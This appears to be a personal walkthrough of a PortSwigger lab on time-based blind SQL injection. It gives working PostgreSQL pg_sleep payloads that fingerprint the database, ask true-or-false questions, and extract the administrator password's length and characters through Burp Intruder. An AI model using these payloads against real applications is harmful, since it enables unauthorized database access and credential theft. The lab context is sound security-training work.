 Blind SQL injection with time delays and information retrieval
 
[LAB](https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval)
 

 #### again focus in " TRACKID " and we will cause SQLi through it

 #### need cause SQLi to delay 10 second for web application

 * 1 - first we need to pay attention to find what database payload right for us to use, so take a test and wait for the response
 -> 1 sec not the right one
 -> when 10 sec it is the right one
 

```

'|| (SELECT SLEEP(10) ) || --

```

-> 200 OK 1 sec > not  MySQL

```

' || ( SELECT pg_sleep(10)) || '--

```

-> 200 OK 10 sec > PostgreSQL

* you will know if it was vulnerable when the response takes 10 sec.
  
Next we confirm the database is " PostgreSQL "
-----------------------------------------------


 i dont want to take a look if the users table exists or not because i already know,
 from the lab no need to watse time for someting we know,
 now we have a mission to log in as administrator so lets do it.
 * 2 - ask the applcation TRUE or FALSE question :
 
 ```

 ' || ( SELECT CASE WHEN (1=1) THEN pg_sleep(10) ELSE pg_sleep(0) END ) || '

```


 --> if its TRUE the response will takes 10 sec .

 ```
 
 ' || ( SELECT CASE WHEN (1=0) THEN pg_sleep(10) ELSE pg_sleep(0) END ) || '

```


 --> if its FALSE takes only 1 sec to responce .
 

## i alos know that administrator is exists lets look for the password .

3 - Enumerate administrator password length :

i prefer to use intruder more easy,

```

' || ( SELECT CASE WHEN (username='administrator' AND LENGTH (password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users ) || '--

```

### First
 
 ![image](https://github.com/Renat9s/sqli-labs/assets/126417250/d7863317-981f-4e55-b490-8cdcee9748f0)

 ### Then chose the numbers
 ![image](https://github.com/Renat9s/sqli-labs/assets/126417250/87ae4d8b-d5a5-4300-b06c-c209ec813503)

 And time to start attack .
 * dont forget to click on Columns and chose Response received, At the top of the page, in intruder. to see the time.

 ![image](https://github.com/Renat9s/sqli-labs/assets/126417250/70099fc7-e820-454d-af88-918b94380e36)

 
-- > length 20 has 10 second response time
it means the length of password only 20 

4- Now for bruteforse i use antruder also :

```

' || ( SELECT CASE WHEN (username='administrator' AND SUBSTRING (password,1,1)='a') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users ) || '--

```


### Now lets set up the payload 
   first step :
   
![image](https://github.com/Renat9s/sqli-labs/assets/126417250/c82f6ce3-badf-46d9-bd5d-e2484434dccc)
   

   Second :

![image](https://github.com/Renat9s/sqli-labs/assets/126417250/ab65ffbf-8a1f-4fa6-865e-02265f623e63)




  Third :
![image](https://github.com/Renat9s/sqli-labs/assets/126417250/a17eefb6-f4f1-4b66-8ea5-a3e59b640268)

Start attack :)

And we found it.

``` pb79orh8jdlag87uqt4d ```

SOLVED THE LAB <3

